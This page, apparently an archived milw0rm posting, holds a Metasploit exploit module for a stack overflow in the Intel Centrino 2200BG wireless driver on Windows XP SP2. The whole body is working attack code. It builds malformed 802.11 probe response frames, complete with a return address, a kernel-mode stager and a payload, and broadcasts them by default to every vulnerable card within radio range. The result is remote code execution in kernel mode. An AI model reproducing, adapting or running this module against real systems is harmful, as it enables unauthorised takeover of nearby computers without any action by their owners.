<html><head><title>Intel Centrino ipw2200BG Wireless Driver Remote BOF Exploit (meta)</title></head><pre>##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'

module Msf

class Exploits::Windows::Driver::Intel_Centrino_2200BG_driver_probe &lt; Msf::Exploit::Remote

	include Exploit::Lorcon
	include Exploit::KernelMode	

	def initialize(info = {})
		super(update_info(info,	
			'Name'           =&gt; 'Intel Centrino 2200BG Wireless Driver Probe Overflow',
			'Description'    =&gt; %q{
				This module exploits a stack overflow in the w22n51.sys driver provided
			with the Intel 2200BG integrated wireless adapter. This stack overflow 
			allows remote code execution in kernel mode. The stack overflow is triggered
			when a 802.11 Probe response frame is received that contains multi vendor specific tag 
			and &quot;\x00&quot; as essid and essid length element. This exploit was tested with version 8.0.12.20000 
			of the  driver and an Intel Centrino 2200BG integrated wireless adapter. Newer
			versions of the w22n51.sys driver are provided from Intel to resolve this flaw.
			Since this vulnerability is exploited via probe response frames, all cards within 
			range of the attack will be affected. 
			
			Vulnerable clients don't need to have their card in a particular state for this exploit 
			to work.
			
			This module depends on the Lorcon library and only works on the Linux platform
			with a supported wireless card. Please see the Ruby Lorcon documentation 
			(external/ruby-lorcon/README) for more information.
			},
			
			'Author'         =&gt; 
				[
					'oveRet \'Giuseppe Gottardi\' &lt;overet [at] securitydate.it', 	# exploit dev
					'skape'								# windows kernel ninjitsu
				],
			'License'        =&gt; MSF_LICENSE,
			'Version'        =&gt; '$Revision: 4529 $',
			'References'     =&gt;
				[
					['URL', 'http://www.kb.cert.org/vuls/id/524332'],
					['URL', 'http://www.milw0rm.org/exploits/3158'],
					['URL', 'http://overet.securitydate.it/stuff/2200BG_8.0.12.20000_drivers.zip']
				],
			'Privileged'     =&gt; true,
                        
			'DefaultOptions' =&gt;
				{
					'EXITFUNC' =&gt; 'thread',
				},

			'Payload'        =&gt;
				{
					'Space'    =&gt; 224
				},
			'Platform'       =&gt; 'win',
			'Targets'        =&gt; 
				[
					# Windows XP SP2
					# 5.1.2600 (xpsp_sp2_gdr.070227-2254)
					[ 'Windows XP SP2 (5.1.2600), w22n51.sys 8.0.12.20000',
						{
							'Ret'      =&gt; 0x8054eb62,
							'Platform' =&gt; 'win',
							'Payload'  =&gt; 
							{
								'ExtendedOptions' =&gt; 
								{
									'Stager'       =&gt; 'sud_syscall_hook',	# don't change this
									'PrependUser'  =&gt; &quot;\xeb\x02&quot; + 		# required jump
											  &quot;\x85\xe0&quot;,		# fixed max len
									'Recovery'     =&gt; 'idlethread_restart',
									'KiIdleLoopAddress' =&gt; 0x804dbb27,
								}
							}
						} 
					]
				],


			'DefaultTarget' =&gt; 0
			))
			
		register_options(
			[
				OptString.new('ADDR_DST', [ true,  &quot;The MAC address to send this to&quot;,'FF:FF:FF:FF:FF:FF']),
				OptInt.new('RUNTIME', [ true,  &quot;The number of time to run the attack&quot;, 1000]),
				OptInt.new('DELAY', [ true,  &quot;The number of seconds to sleep between the packets&quot;, 1]),
			], self.class)
	end
	
	def exploit
		open_wifi
		
                rtime = datastore['RUNTIME'].to_i
		dtime = datastore['DELAY'].to_i
		count = 0

		print_status(&quot;Sending probe exploit to #{datastore['ADDR_DST']}...&quot;)
		print &quot;[-] &quot;

		while (count &lt; rtime)
			wifi.write(create_beacon)
			select(nil, nil, nil, 0.10) if (count % 100 == 0)
			count += 1
			#Exit if we get a session
			break if session_created?
                        
			print &quot;#&quot;
			sleep(dtime)
		end

		print &quot;\n&quot;
		print_status(&quot;Completed sending probe.&quot;)
	end
 
	def create_beacon
		bssid  = (&quot;\x43&quot; * 6)
		src    = (&quot;\x43&quot; * 6)
		seq    = [rand(255)].pack('n')

		fill   = 0xe0 - (payload.encoded.length - 125)
		
		frame =
			&quot;\x50&quot; +                      # type/subtype
			&quot;\x00&quot; +                      # flags
			&quot;\x3a\x01&quot; +                  # duration  
			eton(datastore['ADDR_DST']) + # dst
			src   +                       # src
			bssid +                       # bssid
			seq   +                       # seq  
			rand_text(8) +      	      # timestamp value
			&quot;\xa0\x0f&quot; +                  # beacon interval
			&quot;\x31\x08&quot; +                  # capability flags
			
			# ssid tag
			&quot;\x00\x00&quot; +

			# supported rates
			&quot;\x01&quot; + &quot;\x01&quot; + &quot;\x82&quot; +

			# current channel
			&quot;\x03&quot; + &quot;\x01&quot; + channel.chr +
			
			# fixed max len
			&quot;\x85\x7b&quot; +

			payload.encoded +
			
			# fill to reach e0 length
			(&quot;\x41&quot; * fill) +

			# vendor specific tag
			&quot;\xdd&quot; +
			&quot;\x18&quot; +
			&quot;\x00\x50\xf2\x02\x01\x01\x89\x00\x03\xa5\x00\x00\x27\xa5\x00\x00&quot; +
			&quot;\x42\x54\xbc\x00\x62\x43\x66\x00&quot; +
			
			# vendor specific tag
			&quot;\xdd&quot; +
			&quot;\x10&quot; +
			&quot;\x00\x50\xf2\x05\x00\x01\x00\x04\x00\x00\x83\x07&quot; +
			
			# RET address
			[target['Ret']].pack('V')
								
		return frame
	end
end
end

# milw0rm.com [2008-04-17]</pre></html>